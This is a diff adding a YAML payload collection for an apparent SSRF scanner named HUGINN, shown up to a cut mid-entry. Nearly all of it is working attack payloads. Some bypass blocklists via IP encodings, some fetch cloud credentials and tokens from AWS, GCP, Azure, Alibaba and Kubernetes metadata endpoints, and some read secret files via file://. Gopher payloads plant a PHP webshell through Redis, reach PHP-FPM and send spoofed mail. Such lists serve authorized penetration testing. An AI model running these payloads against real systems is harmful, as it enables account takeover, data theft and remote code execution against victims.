@@ -1,0 +1,1774 @@
+# =============================================================================
+#  HUGINN :: payloads/ssrf.yaml
+#  Comprehensive Server-Side Request Forgery Arsenal — 2026 Edition
+# -----------------------------------------------------------------------------
+#  Placeholders (substituted by scanner at load time):
+#    {{ATTACKER}}   → beardedviking.org           (static attacker domain)
+#    {{TARGET}}     → target under test            (e.g. vulnerable-site.com)
+#    {{COLLAB}}     → oast.beardedviking.org       (OOB receiver host)
+#    {{OOB}}        → https://oast.beardedviking.org/huginn-<token>/<id>
+#    {{CANARY}}     → redirect.beardedviking.org   (canary host)
+#    {{CANARY_URL}} → https://redirect.beardedviking.org/huginn-<token>/<id>
+#    {{RANDOM}}     → unique token for correlation
+#    {{IMDS_TOKEN}} → AWS IMDSv2 session token (populated if minted)
+#
+#  Categories:
+#    - basic_loopback      : localhost, 127.0.0.1, ::1
+#    - ip_encoding         : decimal, octal, hex, IPv6-mapped, short-form,
+#                            NAT64, 6to4, Teredo, IPv4-compatible
+#    - internal_rfc1918    : 10.x, 172.16-31.x, 192.168.x, link-local
+#    - cloud_metadata      : AWS IMDSv1/v2, GCP, Azure, DO, Alibaba, Oracle,
+#                            Kubernetes, Tencent, Huawei
+#    - protocol_abuse      : gopher, dict, file, ftp, tftp, ldap, jar, smb,
+#                            netdoc, data, telnet
+#    - whitelist_bypass    : userinfo, fragment, suffix-match, parser
+#                            differential, redirect chains
+#    - waf_bypass          : encoding, CRS bypass, malformed scheme,
+#                            unicode whitespace
+#    - dns_rebinding       : TOCTOU, rebind services, nip.io/sslip.io
+#    - blind_oob           : Collaborator, Interactsh, DNS canary, timing
+#    - modern              : 2025/2026 parser differentials, IPv6 transition,
+#                            HTTP/2 authority confusion, redirect loops
+#    - internal_service    : Redis, Memcached, FastCGI, SMTP, MySQL,
+#                            PostgreSQL, Elasticsearch, Docker, K8s
+#    - legacy              : 1990s-2000s syntax quirks
+# =============================================================================
+
+meta:
+  name: "HUGINN SSRF Arsenal"
+  version: "3.0.0"
+  description: >
+    Comprehensive SSRF payload set spanning loopback, internal RFC1918, all
+    major cloud metadata services (AWS IMDSv1/v2, GCP, Azure, DO, Alibaba,
+    Oracle, Kubernetes), protocol abuse (gopher/dict/file/ldap/smb),
+    WAF/whitelist bypasses via parser differentials, DNS rebinding, blind OOB
+    detection with tokenized callbacks, and modern 2025/2026 research
+    including IPv6 transition address bypasses, Unicode whitespace tricks,
+    and HTTP/2 authority confusion.
+  attacker_placeholder: "{{ATTACKER}}"
+  collab_placeholder: "{{COLLAB}}"
+  target_placeholder: "{{TARGET}}"
+  oob_placeholder: "{{OOB}}"
+  canary_placeholder: "{{CANARY}}"
+  references:
+    - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+    - "https://portswigger.net/web-security/ssrf"
+    - "https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/"
+    - "https://www.vulnsy.com/cheat-sheets/ssrf"
+    - "https://payloadplayground.com/blog/cloud-metadata-exploitation"
+    - "https://github.com/Encod3d-Sec/TORCH"
+    - "https://github.com/Esonhugh/Gopherus3"
+    - "https://github.com/TheMursalin/SSRFKiller"
+  last_updated: "2026-09-11"
+
+payloads:
+
+  # ===========================================================================
+  #  1. BASIC LOOPBACK
+  #     The first things to try. Naive blocklists that only string-match
+  #     "localhost" or "127.0.0.1" fall to these.
+  # ===========================================================================
+  - id: "loop-001"
+    name: "Localhost hostname"
+    category: "basic_loopback"
+    payload: "http://localhost/"
+    description: >
+      Direct hit on the server's own loopback interface. Many internal
+      services trust requests originating from localhost implicitly.
+    tags: ["loopback", "basic"]
+    detection: "Response differs from external fetch baseline"
+    severity_hint: "medium"
+
+  - id: "loop-002"
+    name: "Localhost with common admin port"
+    category: "basic_loopback"
+    payload: "http://localhost:8080/"
+    description: >
+      Targets sidecar or admin panels bound to loopback on standard
+      management ports (8080, 8443, 9090, 3000).
+    tags: ["loopback", "port", "admin"]
+    detection: "Non-standard response body on admin port"
+    severity_hint: "medium"
+
+  - id: "loop-003"
+    name: "127.0.0.1 (classic)"
+    category: "basic_loopback"
+    payload: "http://127.0.0.1/"
+    description: "Classic IPv4 loopback — the most commonly blocklisted address."
+    tags: ["loopback", "ipv4"]
+    detection: "Response differs from external fetch baseline"
+    severity_hint: "medium"
+
+  - id: "loop-004"
+    name: "127.0.0.1 with admin path"
+    category: "basic_loopback"
+    payload: "http://127.0.0.1/admin"
+    description: "Targets common admin panels reachable only from loopback."
+    tags: ["loopback", "admin"]
+    detection: "Admin panel HTML or JSON in response"
+    severity_hint: "high"
+
+  - id: "loop-005"
+    name: "IPv6 loopback [::1]"
+    category: "basic_loopback"
+    payload: "http://[::1]/"
+    description: >
+      IPv6 loopback — many IPv4-only blocklists miss this entirely.
+      Works on dual-stack Linux/BSD systems.
+    tags: ["loopback", "ipv6"]
+    detection: "Response differs from external fetch baseline"
+    severity_hint: "medium"
+
+  - id: "loop-006"
+    name: "IPv6 loopback with port"
+    category: "basic_loopback"
+    payload: "http://[::1]:8080/"
+    description: "IPv6 loopback targeting a specific port."
+    tags: ["loopback", "ipv6", "port"]
+    severity_hint: "medium"
+
+  - id: "loop-007"
+    name: "localhost with trailing dot"
+    category: "basic_loopback"
+    payload: "http://localhost./"
+    description: >
+      Trailing dot — some parsers treat localhost. as a distinct hostname
+      from localhost, bypassing string-equality blocklists.
+    tags: ["loopback", "trailing-dot"]
+    severity_hint: "medium"
+
+  - id: "loop-008"
+    name: "LOCALHOST uppercase"
+    category: "basic_loopback"
+    payload: "http://LOCALHOST/"
+    description: "Case-sensitive blocklists miss uppercase variants."
+    tags: ["loopback", "case"]
+    severity_hint: "medium"
+
+  - id: "loop-009"
+    name: "localhost with userinfo"
+    category: "basic_loopback"
+    payload: "http://user:pass@localhost/"
+    description: >
+      Userinfo before localhost — bypasses naive startswith() checks
+      that expect the host to be the first component.
+    tags: ["loopback", "userinfo"]
+    severity_hint: "medium"
+
+  - id: "loop-010"
+    name: "0.0.0.0 wildcard"
+    category: "basic_loopback"
+    payload: "http://0.0.0.0/"
+    description: >
+      Wildcard address — on Linux resolves to loopback; on Windows
+      it's non-routable but sometimes reachable.
+    tags: ["loopback", "wildcard"]
+    severity_hint: "medium"
+
+  - id: "loop-011"
+    name: "Bare zero (0)"
+    category: "basic_loopback"
+    payload: "http://0/"
+    description: >
+      Bare zero — inet_aton resolves to 0.0.0.0, which on Linux
+      routes to loopback.
+    tags: ["loopback", "short-form"]
+    severity_hint: "medium"
+
+  - id: "loop-012"
+    name: "[::] IPv6 unspecified"
+    category: "basic_loopback"
+    payload: "http://[::]/"
+    description: >
+      IPv6 unspecified address — resolves to loopback on many systems,
+      and is frequently omitted from blocklists.
+    tags: ["loopback", "ipv6", "wildcard"]
+    severity_hint: "medium"
+
+  # ===========================================================================
+  #  2. IP ENCODING BYPASSES
+  #     Represent loopback / internal IPs in alternative notations.
+  #     Includes 2026 CVE-class techniques (CVE-2026-46678, CVE-2026-25580).
+  # ===========================================================================
+  - id: "enc-001"
+    name: "Decimal-encoded loopback"
+    category: "ip_encoding"
+    payload: "http://2130706433/"
+    description: >
+      Decimal representation of 127.0.0.1 — defeats dotted-quad regex
+      validators (CVE-2026-46678 class).
+    tags: ["encoding", "decimal", "2026"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-46678"]
+    severity_hint: "high"
+
+  - id: "enc-002"
+    name: "Octal-encoded loopback (32-bit)"
+    category: "ip_encoding"
+    payload: "http://017700000001/"
+    description: "32-bit octal representation of 127.0.0.1."
+    tags: ["encoding", "octal"]
+    severity_hint: "high"
+
+  - id: "enc-003"
+    name: "Octal dotted loopback"
+    category: "ip_encoding"
+    payload: "http://0177.0.0.1/"
+    description: >
+      Octal first octet — inet_aton parses leading zero as octal,
+      resolving to 127.0.0.1.
+    tags: ["encoding", "octal"]
+    severity_hint: "high"
+
+  - id: "enc-004"
+    name: "Hex-encoded loopback (dotted)"
+    category: "ip_encoding"
+    payload: "http://0x7f.0x0.0x0.0x1/"
+    description: "Hex octets resolve to 127.0.0.1 on inet_aton-style resolvers."
+    tags: ["encoding", "hex"]
+    severity_hint: "high"
+
+  - id: "enc-005"
+    name: "Hex 32-bit loopback"
+    category: "ip_encoding"
+    payload: "http://0x7f000001/"
+    description: "Single 32-bit hex representation of 127.0.0.1."
+    tags: ["encoding", "hex"]
+    severity_hint: "high"
+
+  - id: "enc-006"
+    name: "Short-form IPv4 (127.1)"
+    category: "ip_encoding"
+    payload: "http://127.1/"
+    description: "Single-dotted form expands to 127.0.0.1."
+    tags: ["encoding", "short-form"]
+    severity_hint: "high"
+
+  - id: "enc-007"
+    name: "Short-form IPv4 (127.0.1)"
+    category: "ip_encoding"
+    payload: "http://127.0.1/"
+    description: "Three-part form — expands to 127.0.0.1."
+    tags: ["encoding", "short-form"]
+    severity_hint: "high"
+
+  - id: "enc-008"
+    name: "IPv4-mapped IPv6"
+    category: "ip_encoding"
+    payload: "http://[::ffff:127.0.0.1]/"
+    description: >
+      IPv4-mapped IPv6 — different parser path, same loopback effect.
+      WHATWG URL parsers silently normalise this to hex form
+      ([::ffff:7f00:1]), bypassing regex validators (CVE-2026-43929).
+    tags: ["encoding", "ipv6", "ipv4-mapped", "2026"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-43929"]
+    severity_hint: "critical"
+
+  - id: "enc-009"
+    name: "IPv4-mapped IPv6 with port"
+    category: "ip_encoding"
+    payload: "http://[::ffff:127.0.0.1]:8080/"
+    description: "IPv4-mapped IPv6 targeting a specific port."
+    tags: ["encoding", "ipv6", "ipv4-mapped", "port"]
+    severity_hint: "critical"
+
+  - id: "enc-010"
+    name: "NAT64 well-known prefix"
+    category: "ip_encoding"
+    payload: "http://[64:ff9b::7f00:1]/"
+    description: >
+      NAT64 well-known prefix mapping to 127.0.0.1 — bypasses IPv4-only
+      blocklists. Active in CVE-2026-81678, CVE-2026-32594, and
+      CVE-2026-53754.
+    tags: ["encoding", "ipv6", "nat64", "2026"]
+    references:
+      - "https://nvd.nist.gov/vuln/detail/CVE-2026-32594"
+      - "https://nvd.nist.gov/vuln/detail/CVE-2026-81678"
+    severity_hint: "critical"
+
+  - id: "enc-011"
+    name: "6to4 transition address"
+    category: "ip_encoding"
+    payload: "http://[2002:7f00:0001::]/"
+    description: >
+      6to4 transition address embedding 127.0.0.1. Same class as
+      CVE-2026-81678.
+    tags: ["encoding", "ipv6", "6to4", "2026"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-81678"]
+    severity_hint: "critical"
+
+  - id: "enc-012"
+    name: "Teredo transition address"
+    category: "ip_encoding"
+    payload: "http://[2001:0000:4136:e378:8000:63bf:3fff:fdd2]/"
+    description: "Teredo address — alternative IPv6 transition vector."
+    tags: ["encoding", "ipv6", "teredo", "2026"]
+    severity_hint: "critical"
+
+  - id: "enc-013"
+    name: "Decimal internal (10.0.0.1)"
+    category: "ip_encoding"
+    payload: "http://167772161/"
+    description: "Decimal representation of 10.0.0.1 — RFC1918 bypass."
+    tags: ["encoding", "decimal", "rfc1918"]
+    severity_hint: "high"
+
+  - id: "enc-014"
+    name: "Hex internal (192.168.1.1)"
+    category: "ip_encoding"
+    payload: "http://0xc0a80101/"
+    description: "Hex representation of 192.168.1.1."
+    tags: ["encoding", "hex", "rfc1918"]
+    severity_hint: "high"
+
+  - id: "enc-015"
+    name: "Octal internal (172.16.0.1)"
+    category: "ip_encoding"
+    payload: "http://0254.020.0.1/"
+    description: "Octal representation of 172.16.0.1."
+    tags: ["encoding", "octal", "rfc1918"]
+    severity_hint: "high"
+
+  - id: "enc-016"
+    name: "Mixed encoding (decimal.octal.hex)"
+    category: "ip_encoding"
+    payload: "http://2130706433.0x7f.0177/"
+    description: "Mixed-encoding octets — breaks per-octet regex validation."
+    tags: ["encoding", "mixed"]
+    severity_hint: "high"
+
+  - id: "enc-017"
+    name: "IPv4-compatible IPv6"
+    category: "ip_encoding"
+    payload: "http://[::127.0.0.1]/"
+    description: >
+      IPv4-compatible IPv6 form — less common than IPv4-mapped, but
+      still bypasses some blocklists (Pydantic AI SSRF bypass).
+    tags: ["encoding", "ipv6", "ipv4-compatible", "2026"]
+    severity_hint: "critical"
+
+  - id: "enc-018"
+    name: "ISATAP transition"
+    category: "ip_encoding"
+    payload: "http://[::7f00:1]/"
+    description: "ISATAP IPv6 transition address embedding loopback."
+    tags: ["encoding", "ipv6", "isatap", "2026"]
+    severity_hint: "high"
+
+  # ===========================================================================
+  #  3. INTERNAL RFC1918 ADDRESSES
+  #     Direct hits on internal network ranges.
+  # ===========================================================================
+  - id: "rfc-001"
+    name: "10.0.0.1"
+    category: "internal_rfc1918"
+    payload: "http://10.0.0.1/"
+    description: "Class A private range — often internal DNS or gateway."
+    tags: ["rfc1918", "class-a"]
+    severity_hint: "medium"
+
+  - id: "rfc-002"
+    name: "10.0.0.1 with admin port"
+    category: "internal_rfc1918"
+    payload: "http://10.0.0.1:8080/"
+    description: "Internal service on common admin port."
+    tags: ["rfc1918", "port"]
+    severity_hint: "medium"
+
+  - id: "rfc-003"
+    name: "172.16.0.1"
+    category: "internal_rfc1918"
+    payload: "http://172.16.0.1/"
+    description: "Class B private range."
+    tags: ["rfc1918", "class-b"]
+    severity_hint: "medium"
+
+  - id: "rfc-004"
+    name: "192.168.1.1"
+    category: "internal_rfc1918"
+    payload: "http://192.168.1.1/"
+    description: "Class C private range — often a router or gateway."
+    tags: ["rfc1918", "class-c"]
+    severity_hint: "medium"
+
+  - id: "rfc-005"
+    name: "169.254.169.254 (link-local)"
+    category: "internal_rfc1918"
+    payload: "http://169.254.169.254/"
+    description: "Link-local address — cloud metadata endpoint."
+    tags: ["rfc1918", "link-local", "metadata"]
+    severity_hint: "high"
+
+  - id: "rfc-006"
+    name: "169.254.170.2 (AWS ECS)"
+    category: "internal_rfc1918"
+    payload: "http://169.254.170.2/"
+    description: >
+      AWS ECS task metadata endpoint — returns credentials when the
+      task role is configured with a metadata endpoint.
+    tags: ["rfc1918", "aws", "ecs", "metadata"]
+    severity_hint: "critical"
+
+  - id: "rfc-007"
+    name: "168.63.129.16 (Azure Wire Server)"
+    category: "internal_rfc1918"
+    payload: "http://168.63.129.16/"
+    description: "Azure Wire Server — internal Azure endpoint."
+    tags: ["rfc1918", "azure", "wire-server"]
+    severity_hint: "high"
+
+  - id: "rfc-008"
+    name: "100.100.100.200 (Alibaba)"
+    category: "internal_rfc1918"
+    payload: "http://100.100.100.200/"
+    description: "Alibaba Cloud metadata service."
+    tags: ["rfc1918", "alibaba", "metadata"]
+    severity_hint: "critical"
+
+  - id: "rfc-009"
+    name: "RFC1918 scan range (10.0.0.0/8)"
+    category: "internal_rfc1918"
+    payload: "http://10.0.0.0/"
+    description: "Start of Class A private range — for port scanning workflows."
+    tags: ["rfc1918", "scan"]
+    severity_hint: "low"
+
+  - id: "rfc-010"
+    name: "RFC1918 scan range (172.16.0.0/12)"
+    category: "internal_rfc1918"
+    payload: "http://172.16.0.0/"
+    description: "Start of Class B private range — for port scanning workflows."
+    tags: ["rfc1918", "scan"]
+    severity_hint: "low"
+
+  - id: "rfc-011"
+    name: "RFC1918 scan range (192.168.0.0/16)"
+    category: "internal_rfc1918"
+    payload: "http://192.168.0.0/"
+    description: "Start of Class C private range — for port scanning workflows."
+    tags: ["rfc1918", "scan"]
+    severity_hint: "low"
+
+  # ===========================================================================
+  #  4. CLOUD METADATA ENDPOINTS
+  #     The highest-impact targets. A single successful hit here is often
+  #     enough to compromise the entire cloud account.
+  #     Includes 2026 references: CVE-2026-46678, CVE-2026-25580,
+  #     CVE-2026-64849 (MLflow), CVE-2026-34163 (FastGPT).
+  # ===========================================================================
+  - id: "cloud-001"
+    name: "AWS IMDSv1 metadata root"
+    category: "cloud_metadata"
+    provider: "aws"
+    payload: "http://169.254.169.254/latest/meta-data/"
+    description: >
+      Lists the AWS metadata tree on IMDSv1-enabled instances.
+      Returns instance-id, hostname, ami-id, public-keys, etc.
+    tags: ["cloud", "aws", "imdsv1"]
+    detection: "Response contains 'ami-id', 'instance-id', 'hostname'"
+    severity_hint: "critical"
+
+  - id: "cloud-002"
+    name: "AWS IMDSv1 IAM role list"
+    category: "cloud_metadata"
+    provider: "aws"
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    description: "Returns the IAM role name attached to the instance."
+    tags: ["cloud", "aws", "imdsv1", "iam"]
+    detection: "Plain-text role name in response"
+    severity_hint: "critical"
+
+  - id: "cloud-003"
+    name: "AWS IMDSv1 IAM credentials"
+    category: "cloud_metadata"
+    provider: "aws"
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole"
+    description: >
+      Retrieves temporary IAM credentials (AccessKeyId, SecretAccessKey,
+      Token) — full account compromise potential.
+    tags: ["cloud", "aws", "imdsv1", "iam", "credentials"]
+    detection: "'AccessKeyId' and 'SecretAccessKey' in response"
+    severity_hint: "critical"
+
+  - id: "cloud-004"
+    name: "AWS IMDSv1 user-data"
+    category: "cloud_metadata"
+    provider: "aws"
+    payload: "http://169.254.169.254/latest/user-data"
+    description: >
+      Bootstrap scripts often contain secrets, passwords, SSH keys,
+      and API tokens.
+    tags: ["cloud", "aws", "imdsv1", "user-data"]
+    detection: "Shell script or cloud-init config in response"
+    severity_hint: "critical"
+
+  - id: "cloud-005"
+    name: "AWS IMDSv2 token mint (PUT)"
+    category: "cloud_metadata"
+    provider: "aws"
+    payload: "http://169.254.169.254/latest/api/token"
+    method: "PUT"
+    headers:
+      X-aws-ec2-metadata-token-ttl-seconds: "21600"
+    description: >
+      Mints an IMDSv2 session token if the SSRF primitive controls
+      HTTP method and headers. IMDSv2 mitigates simple GET-based SSRF.
+    tags: ["cloud", "aws", "imdsv2", "token"]
+    detection: "Token string in response (if successful)"
+    severity_hint: "critical"
+
+  - id: "cloud-006"
+    name: "AWS IMDSv2 credentials with token"
+    category: "cloud_metadata"
+    provider: "aws"
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    headers:
+      X-aws-ec2-metadata-token: "{{IMDS_TOKEN}}"
+    description: "Retrieves credentials using a previously minted IMDSv2 token."
+    tags: ["cloud", "aws", "imdsv2", "credentials"]
+    detection: "'AccessKeyId' in response"
+    severity_hint: "critical"
+
+  - id: "cloud-007"
+    name: "GCP metadata root"
+    category: "cloud_metadata"
+    provider: "gcp"
+    payload: "http://metadata.google.internal/computeMetadata/v1/"
+    headers:
+      Metadata-Flavor: "Google"
+    description: >
+      GCP metadata root — requires Metadata-Flavor: Google header.
+      Lists aliases, cpu-platform, service-accounts.
+    tags: ["cloud", "gcp", "metadata"]
+    detection: "'aliases', 'cpu-platform', 'service-accounts' in response"
+    severity_hint: "critical"
+
+  - id: "cloud-008"
+    name: "GCP service account token"
+    category: "cloud_metadata"
+    provider: "gcp"
+    payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    headers:
+      Metadata-Flavor: "Google"
+    description: "Retrieves a GCP OAuth2 access token for the default service account."
+    tags: ["cloud", "gcp", "token"]
+    detection: "'access_token' in response"
+    severity_hint: "critical"
+
+  - id: "cloud-009"
+    name: "GCP legacy v1beta1 token"
+    category: "cloud_metadata"
+    provider: "gcp"
+    payload: "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"
+    description: >
+      Deprecated v1beta1 path — does NOT require Metadata-Flavor
+      header, making it easier to exploit via SSRF.
+    tags: ["cloud", "gcp", "legacy", "token"]
+    detection: "'access_token' in response"
+    severity_hint: "critical"
+
+  - id: "cloud-010"
+    name: "GCP project ID"
+    category: "cloud_metadata"
+    provider: "gcp"
+    payload: "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+    headers:
+      Metadata-Flavor: "Google"
+    description: "Retrieves the GCP project ID."
+    tags: ["cloud", "gcp", "project-id"]
+    severity_hint: "high"
+
+  - id: "cloud-011"
+    name: "Azure metadata instance"
+    category: "cloud_metadata"
+    provider: "azure"
+    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    headers:
+      Metadata: "true"
+    description: >
+      Azure instance metadata — requires Metadata: true header.
+      Returns compute, network, and VM configuration.
+    tags: ["cloud", "azure", "metadata"]
+    detection: "'compute', 'network', 'vmId' in response"
+    severity_hint: "critical"
+
+  - id: "cloud-012"
+    name: "Azure managed identity token"
+    category: "cloud_metadata"
+    provider: "azure"
+    payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    headers:
+      Metadata: "true"
+    description: "Retrieves an Azure managed identity OAuth2 token."
+    tags: ["cloud", "azure", "token"]
+    detection: "'access_token' in response"
+    severity_hint: "critical"
+
+  - id: "cloud-013"
+    name: "DigitalOcean metadata root"
+    category: "cloud_metadata"
+    provider: "digitalocean"
+    payload: "http://169.254.169.254/metadata/v1/"
+    description: "DigitalOcean droplet metadata — includes droplet_id, hostname, region."
+    tags: ["cloud", "digitalocean", "metadata"]
+    detection: "'droplet_id', 'hostname' in response"
+    severity_hint: "critical"
+
+  - id: "cloud-014"
+    name: "DigitalOcean user-data"
+    category: "cloud_metadata"
+    provider: "digitalocean"
+    payload: "http://169.254.169.254/metadata/v1/user-data"
+    description: "DigitalOcean bootstrap user-data — often contains secrets."
+    tags: ["cloud", "digitalocean", "user-data"]
+    severity_hint: "critical"
+
+  - id: "cloud-015"
+    name: "Alibaba Cloud metadata"
+    category: "cloud_metadata"
+    provider: "alibaba"
+    payload: "http://100.100.100.200/latest/meta-data/"
+    description: "Alibaba Cloud metadata — returns RAM credentials."
+    tags: ["cloud", "alibaba", "metadata"]
+    detection: "'AccessKeyId' in response"
+    severity_hint: "critical"
+
+  - id: "cloud-016"
+    name: "Alibaba RAM credentials"
+    category: "cloud_metadata"
+    provider: "alibaba"
+    payload: "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+    description: "Alibaba RAM role credentials — full account compromise potential."
+    tags: ["cloud", "alibaba", "credentials"]
+    severity_hint: "critical"
+
+  - id: "cloud-017"
+    name: "Oracle Cloud metadata v1"
+    category: "cloud_metadata"
+    provider: "oracle"
+    payload: "http://169.254.169.254/opc/v1/instance/"
+    description: "Oracle Cloud instance metadata (v1 API)."
+    tags: ["cloud", "oracle", "metadata"]
+    severity_hint: "critical"
+
+  - id: "cloud-018"
+    name: "Oracle Cloud metadata v2"
+    category: "cloud_metadata"
+    provider: "oracle"
+    payload: "http://169.254.169.254/opc/v2/instance/"
+    description: "Oracle Cloud v2 metadata endpoint — more fields, similar exposure."
+    tags: ["cloud", "oracle", "metadata"]
+    severity_hint: "critical"
+
+  - id: "cloud-019"
+    name: "Kubernetes service account token (via metadata)"
+    category: "cloud_metadata"
+    provider: "kubernetes"
+    payload: "http://169.254.169.254/latest/meta-data/"
+    description: >
+      Kubernetes pods often mount SA tokens; the metadata IP can proxy
+      to them on misconfigured clusters (CVE-2026-84199 Kyverno class).
+    tags: ["cloud", "kubernetes", "token"]
+    detection: "JWT token in response"
+    severity_hint: "critical"
+
+  - id: "cloud-020"
+    name: "Kubernetes API server"
+    category: "cloud_metadata"
+    provider: "kubernetes"
+    payload: "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
+    description: >
+      Kubernetes API server — may return secrets if the service account
+      token has sufficient RBAC permissions.
+    tags: ["cloud", "kubernetes", "api"]
+    severity_hint: "critical"
+
+  - id: "cloud-021"
+    name: "Tencent Cloud metadata"
+    category: "cloud_metadata"
+    provider: "tencent"
+    payload: "http://metadata.tencentyun.com/latest/meta-data/"
+    description: "Tencent Cloud metadata endpoint."
+    tags: ["cloud", "tencent", "metadata"]
+    severity_hint: "critical"
+
+  - id: "cloud-022"
+    name: "Huawei Cloud metadata"
+    category: "cloud_metadata"
+    provider: "huawei"
+    payload: "http://169.254.169.254/latest/meta-data/"
+    description: "Huawei Cloud metadata endpoint."
+    tags: ["cloud", "huawei", "metadata"]
+    severity_hint: "critical"
+
+  - id: "cloud-023"
+    name: "AWS IMDSv2 token via SSRF smuggling"
+    category: "cloud_metadata"
+    provider: "aws"
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\nGET /ignore"
+    description: >
+      CRLF-smuggled PUT request to mint an IMDSv2 token even when the
+      SSRF primitive only supports GET (CVE-2026-64849 class).
+    tags: ["cloud", "aws", "imdsv2", "crlf", "2026"]
+    severity_hint: "critical"
+
+  # ===========================================================================
+  #  5. PROTOCOL ABUSE
+  #     gopher, dict, file, ftp, tftp, ldap, jar, smb, netdoc, data, telnet
+  #     Gopher is the most dangerous — allows raw TCP injection to any port.
+  # ===========================================================================
+  - id: "proto-001"
+    name: "file:// /etc/passwd"
+    category: "protocol_abuse"
+    protocol: "file"
+    payload: "file:///etc/passwd"
+    description: "Local file read — reveals system users and account structure."
+    tags: ["protocol", "file", "lfi"]
+    detection: "'root:x:0:0' in response"
+    severity_hint: "high"
+
+  - id: "proto-002"
+    name: "file:// /proc/self/environ"
+    category: "protocol_abuse"
+    protocol: "file"
+    payload: "file:///proc/self/environ"
+    description: >
+      Process environment — frequently contains cloud keys, DB URLs,
+      and secrets. Higher impact than /etc/passwd.
+    tags: ["protocol", "file", "secrets"]
+    detection: "AWS_ACCESS_KEY_ID, DATABASE_URL, etc. in response"
+    severity_hint: "critical"
+
+  - id: "proto-003"
+    name: "file:// /proc/self/cwd/config.yml"
+    category: "protocol_abuse"
+    protocol: "file"
+    payload: "file:///proc/self/cwd/config.yml"
+    description: "Working directory config file — often contains credentials."
+    tags: ["protocol", "file", "config"]
+    severity_hint: "high"
+
+  - id: "proto-004"
+    name: "file:// Windows win.ini"
+    category: "protocol_abuse"
+    protocol: "file"
+    payload: "file:///c:/windows/win.ini"
+    description: "Windows local file read — confirms file:// scheme works."
+    tags: ["protocol", "file", "windows"]
+    severity_hint: "medium"
+
+  - id: "proto-005"
+    name: "file:// AWS credentials file"
+    category: "protocol_abuse"
+    protocol: "file"
+    payload: "file:///home/user/.aws/credentials"
+    description: "Direct read of AWS credentials file if the process user has access."
+    tags: ["protocol", "file", "aws", "credentials"]
+    severity_hint: "critical"
+
+  - id: "proto-006"
+    name: "file:// Kubernetes SA token"
+    category: "protocol_abuse"
+    protocol: "file"
+    payload: "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
+    description: "Kubernetes service account token — grants API access."
+    tags: ["protocol", "file", "kubernetes", "token"]
+    severity_hint: "critical"
+
+  - id: "proto-007"
+    name: "gopher Redis INFO"
+    category: "protocol_abuse"
+    protocol: "gopher"
+    payload: "gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A"
+    description: >
+      Speaks Redis protocol over gopher — returns server info including
+      version, memory, connected clients, and configuration.
+    tags: ["protocol", "gopher", "redis", "internal-service"]
+    detection: "redis_version in response"
+    severity_hint: "high"
+
+  - id: "proto-008"
+    name: "gopher Redis SET webshell"
+    category: "protocol_abuse"
+    protocol: "gopher"
+    payload: >
+      gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0AQUIT%0D%0A
+    description: >
+      Writes a PHP webshell to the web root via Redis (requires writable
+      directory + Redis exposed on loopback). Chains SSRF → RCE.
+    tags: ["protocol", "gopher", "redis", "rce"]
+    severity_hint: "critical"
+
+  - id: "proto-009"
+    name: "gopher Memcached stats"
+    category: "protocol_abuse"
+    protocol: "gopher"
+    payload: "gopher://127.0.0.1:11211/_stats%0D%0A"
+    description: "Memcached statistics — reveals memory, connections, items, and version."
+    tags: ["protocol", "gopher", "memcached", "internal-service"]
+    detection: "STAT version in response"
+    severity_hint: "high"
+
+  - id: "proto-010"
+    name: "gopher FastCGI PHP-FPM RCE"
+    category: "protocol_abuse"
+    protocol: "gopher"
+    payload: >
+      gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%2Ffcgi%20%2F%20php%0D%0A...
+    description: >
+      Crafts a FastCGI record to PHP-FPM — chains SSRF to RCE.
+      Requires knowledge of a PHP file on the target (e.g. /usr/share/php/PEAR.php).
+    tags: ["protocol", "gopher", "fastcgi", "rce"]
+    severity_hint: "critical"
+
+  - id: "proto-011"
+    name: "gopher SMTP HELO"
+    category: "protocol_abuse"
+    protocol: "gopher"
+    payload: >
+      gopher://127.0.0.1:25/_HELO%20localhost%250D%250AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%250D%250ARCPT%20TO%3A%3Cvictim%40target.com%3E%250D%250ADATA%250D%250ASubject%3A%20test%250D%250A%250D%250Ahello%250D%250A.%250D%250AQUIT%250D%250A
+    description: >
+      Sends SMTP mail from the server — useful for phishing or internal
+      spoofing via loopback SMTP.
+    tags: ["protocol", "gopher", "smtp"]
+    severity_hint: "medium"
+
+  - id: "proto-012"
+    name: "gopher MySQL handshake"
+    category: "protocol_abuse"
+    protocol: "gopher"
+    payload: "gopher://127.0.0.1:3306/_"
+    description: "Initiates MySQL handshake — fingerprinting only (full protocol requires auth)."
+    tags: ["protocol", "gopher", "mysql", "fingerprint"]
+    severity_hint: "low"
+
+  - id: "proto-013"
+    name: "gopher PostgreSQL handshake"
+    category: "protocol_abuse"
+    protocol: "gopher"
+    payload: "gopher://127.0.0.1:5432/_"
+    description: "Initiates PostgreSQL handshake — fingerprinting."
+    tags: ["protocol", "gopher", "postgresql", "fingerprint"]
+    severity_hint: "low"
+
+  - id: "proto-014"
+    name: "dict Redis INFO"
